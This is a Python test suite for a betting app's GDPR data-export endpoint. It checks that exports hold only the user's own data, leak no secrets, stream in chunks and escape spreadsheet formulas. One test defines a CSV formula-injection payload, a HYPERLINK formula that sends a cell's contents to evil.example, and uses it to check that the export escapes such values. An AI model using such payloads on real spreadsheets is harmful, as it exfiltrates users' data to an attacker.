"""Экспорт своих данных GET /api/me/export (GDPR, В10): JSON одним файлом и CSV в ZIP,
частями; только свое и без секретов — значения секретов фикстуры ищутся в байтах файла
(у ZIP — в распакованных файлах)."""

import csv
import io
import json
import zipfile
from datetime import timedelta
from decimal import Decimal
from typing import Any

import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.security.tokens import hash_token, new_token
from app.db.models import (
    AgentRun,
    Bookmaker,
    LoginEvent,
    NotificationPref,
    PlayLimit,
    RecoveryCode,
    TrustedDevice,
    User,
    UserSession,
)
from app.services import data_export
from app.services.auth import issue_recovery_codes
from app.services.notifications import notify
from app.services.sessions import utcnow
from tests.analysis_helpers import set_own_key
from tests.claude_mock import OTHER_KEY
from tests.helpers_admin import Signed, admin_signed_in, signed_in
from tests.helpers_bets import BetMaker, LegSpec
from tests.support import DEFAULT_PASSWORD, ClientFactory, LoginFn, MadeUser, UserFactory


async def _fill(db: AsyncSession, maker: BetMaker, made: MadeUser, tag: str) -> dict[str, Any]:
    """Данные участника с меткой tag в названиях; возвращает значения секретов."""
    bet = await maker.bet(made, [LegSpec(), LegSpec()], bookmaker=f"Book-{tag}", stake="123.45")
    db.add(Bookmaker(user_id=made.id, name=f"Book-{tag}", created_at=utcnow()))
    db.add(PlayLimit(user_id=made.id, bets_per_day=4, stake_per_day=Decimal("900"), currency="RUB"))
    db.add(NotificationPref(user_id=made.id, kind="bet_settled", on_site=False))
    db.add(
        AgentRun(
            user_id=made.id,
            key_source="admin",
            kind="parse",
            model="claude-haiku-5-5",
            input_tokens=111,
            output_tokens=22,
            cost_usd=Decimal("0.0042"),
        )
    )
    db.add(
        LoginEvent(
            user_id=made.id, ip="10.9.9.9", user_agent=f"UA-{tag}", result="ok", method="password"
        )
    )
    await notify(db, user_id=made.id, kind="new_device", device=f"Device-{tag}", ip="10.9.9.9")
    device_token = new_token()
    db.add(
        TrustedDevice(
            user_id=made.id,
            token_hash=hash_token(device_token),
            expires_at=utcnow() + timedelta(days=30),
            device_label=f"Phone-{tag}",
        )
    )
    codes = await issue_recovery_codes(db, made.id)
    await db.commit()
    user = await db.get_one(User, made.id)
    await set_own_key(db, user)
    code_hashes = list(
        await db.scalars(select(RecoveryCode.code_hash).where(RecoveryCode.user_id == made.id))
    )
    user = await db.get_one(User, made.id, populate_existing=True)
    return {
        "bet_id": bet.id,
        "password_hash": user.password_hash,
        "totp_secret": made.totp_secret,
        "totp_enc": user.totp_secret_enc,
        "device_token": device_token,
        "device_hash": hash_token(device_token),
        "codes": codes,
        "code_hashes": code_hashes,
    }


async def _session_hashes(db: AsyncSession, user_id: int) -> list[str]:
    return list(await db.scalars(select(UserSession.id_hash).where(UserSession.user_id == user_id)))


def _assert_no_secrets(raw: bytes, secrets: dict[str, Any], session_hashes: list[str]) -> None:
    text = raw.decode("utf-8")
    values = [
        secrets["password_hash"],
        secrets["totp_secret"],
        secrets["device_token"],
        secrets["device_hash"],
        OTHER_KEY,
        DEFAULT_PASSWORD,
        *secrets["codes"],
        *secrets["code_hashes"],
        *session_hashes,
    ]
    for value in values:
        assert value and value not in text, value
    assert secrets["totp_enc"] not in raw
    for word in ("password_hash", "totp_secret", "ciphertext", "last4", "id_hash", "token_hash"):
        assert word not in text, word


async def _world(
    make_client: ClientFactory, make_user: UserFactory, login: LoginFn, db: AsyncSession
) -> tuple[Signed, dict[str, Any], dict[str, Any]]:
    maker = BetMaker(db)
    member = await signed_in(make_client, make_user, login, email="me@example.com")
    other = await make_user(email="stranger@example.com")
    mine = await _fill(db, maker, member.user, "mine")
    theirs = await _fill(db, maker, other, "theirs")
    return member, mine, theirs


async def test_json_export_is_own_and_without_secrets(
    make_client: ClientFactory, make_user: UserFactory, login: LoginFn, db: AsyncSession
) -> None:
    member, mine, theirs = await _world(make_client, make_user, login, db)
    response = await member.client.get("/api/me/export")
    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("application/json")
    disposition = response.headers["content-disposition"]
    assert disposition.startswith('attachment; filename="capper-export-')
    assert disposition.endswith('.json"')
    assert response.headers["cache-control"] == "no-store"
    raw = response.content
    data = json.loads(raw)
    assert data["format"] == "ai-capper-export" and data["currency"] == "RUB"
    assert data["profile"]["email"] == "me@example.com"
    tables = data["tables"]
    assert [bet["id"] for bet in tables["bets"]] == [mine["bet_id"]]
    assert tables["bets"][0]["stake"] == "123.45"
    legs = tables["bet_legs"]
    assert len(legs) == 2 and {leg["bet_id"] for leg in legs} == {mine["bet_id"]}
    assert legs[0]["p_final"] == 0.62 and legs[0]["odds_taken"] == "1.800"
    assert {row["kind"] for row in tables["bank_ledger"]} == {"deposit", "stake"}
    assert [row["name"] for row in tables["bookmakers"]] == ["Book-mine"]
    assert tables["play_limits"][0]["stake_per_day"] == "900.00"
    assert [row["kind"] for row in tables["notification_prefs"]] == ["bet_settled"]
    assert tables["ai_runs"][0]["input_tokens"] == 111
    assert "Device-mine" in tables["notifications"][0]["body"]
    assert tables["login_events"][0]["user_agent"] == "UA-mine"
    assert tables["trusted_devices"][0]["device_label"] == "Phone-mine"
    assert len(tables["analyses"]) == 1 and len(tables["predictions"]) == 2
    # Чужого нет
    text = raw.decode()
    for foreign in (
        "stranger@example.com",
        "Book-theirs",
        "UA-theirs",
        "Device-theirs",
        "Phone-theirs",
    ):
        assert foreign not in text
    assert str(theirs["bet_id"]) not in {str(bet["id"]) for bet in tables["bets"]}
    _assert_no_secrets(raw, mine, await _session_hashes(db, member.id))
    _assert_no_secrets(raw, theirs, [])


async def test_csv_zip_export(
    make_client: ClientFactory, make_user: UserFactory, login: LoginFn, db: AsyncSession
) -> None:
    member, mine, theirs = await _world(make_client, make_user, login, db)
    response = await member.client.get("/api/me/export", params={"format": "csv"})
    assert response.status_code == 200, response.text
    assert response.headers["content-type"] == "application/zip"
    assert response.headers["content-disposition"].endswith('.zip"')
    archive = zipfile.ZipFile(io.BytesIO(response.content))
    names = archive.namelist()
    assert names[:2] == ["export.json", "profile.csv"]
    assert {
        "bets.csv",
        "bet_legs.csv",
        "bank_ledger.csv",
        "ai_runs.csv",
        "login_events.csv",
    } <= set(names)
    contents = b"".join(archive.read(name) for name in names)
    bets = archive.read("bets.csv").decode("utf-8-sig").splitlines()
    assert bets[0].startswith("id,analysis_id,placed_at,bookmaker,stake")
    assert len(bets) == 2 and "123.45" in bets[1] and "Book-mine" in bets[1]
    # Пустая таблица — только заголовок
    lessons = archive.read("lessons.csv").decode("utf-8-sig").splitlines()
    assert len(lessons) == 1
    text = contents.decode("utf-8")
    assert "stranger@example.com" not in text and "Book-theirs" not in text
    _assert_no_secrets(contents, mine, await _session_hashes(db, member.id))
    _assert_no_secrets(contents, theirs, [])


def _csv_table(archive: zipfile.ZipFile, name: str) -> list[dict[str, str]]:
    text = archive.read(name).decode("utf-8-sig")
    return list(csv.DictReader(io.StringIO(text)))


async def _zip(signed: Signed) -> zipfile.ZipFile:
    response = await signed.client.get("/api/me/export", params={"format": "csv"})
    assert response.status_code == 200, response.text
    return zipfile.ZipFile(io.BytesIO(response.content))


FORMULA = '=HYPERLINK("https://evil.example/?d="&A2,"open")'


async def test_csv_export_text_is_not_formula(
    make_client: ClientFactory, make_user: UserFactory, login: LoginFn
) -> None:
    """Чужой текст в своей выгрузке не становится формулой таблицы: имя участника в
    заголовке уведомления администратора, сообщение администратора у участника. Числа
    (отрицательные тоже) не трогаем."""
    admin = await admin_signed_in(make_client, make_user, login)
    member = await signed_in(make_client, make_user, login, ip="10.0.0.2", ai_mode="own")
    renamed = await member.client.patch("/api/me", json={"display_name": FORMULA})
    assert renamed.status_code == 200, renamed.text
    asked = await member.client.post("/api/me/ai-mode/return-request")
    assert asked.status_code < 300, asked.text
    sent = await admin.client.post(
        "/api/admin/messages", json={"text": "=1+1", "user_id": member.id, "preview": False}
    )
    assert sent.status_code == 201, sent.text

    def cells(archive: zipfile.ZipFile) -> list[str]:
        return [
            cell
            for name in archive.namelist()
            if name.endswith(".csv")
            for row in _csv_table(archive, name)
            for cell in row.values()
        ]

    theirs = await _zip(admin)
    titles = [row["title"] for row in _csv_table(theirs, "notifications.csv")]
    assert "'" + FORMULA + " просит вернуть ключ администратора" in titles
    mine = await _zip(member)
    assert _csv_table(mine, "profile.csv")[0]["display_name"] == "'" + FORMULA
    assert "=1+1" in mine.read("notifications.csv").decode("utf-8-sig")
    for archive in (theirs, mine):
        assert not [cell for cell in cells(archive) if cell.startswith(("=", "+", "@"))]
        # «-» в начале — только у чисел
        for cell in cells(archive):
            if cell.startswith("-"):
                Decimal(cell)


async def test_export_goes_in_parts(
    make_user: UserFactory, db: AsyncSession, monkeypatch: pytest.MonkeyPatch
) -> None:
    made = await make_user()
    maker = BetMaker(db)
    for _ in range(5):
        await maker.bet(made, [LegSpec(), LegSpec()])
    monkeypatch.setattr(data_export, "_CHUNK_BYTES", 200)
    user = await db.get_one(User, made.id)
    parts = [part async for part in data_export.json_chunks(db, user)]
    assert len(parts) > 3
    data = json.loads(b"".join(parts))
    assert len(data["tables"]["bets"]) == 5
    zipped = [part async for part in data_export.zip_chunks(db, user)]
    assert len(zipped) > 3
    archive = zipfile.ZipFile(io.BytesIO(b"".join(zipped)))
    assert archive.testzip() is None
    assert len(archive.read("bets.csv").decode("utf-8-sig").splitlines()) == 6


async def test_export_format_validation(
    make_client: ClientFactory, make_user: UserFactory, login: LoginFn
) -> None:
    member = await signed_in(make_client, make_user, login)
    response = await member.client.get("/api/me/export", params={"format": "xml"})
    assert response.status_code == 422
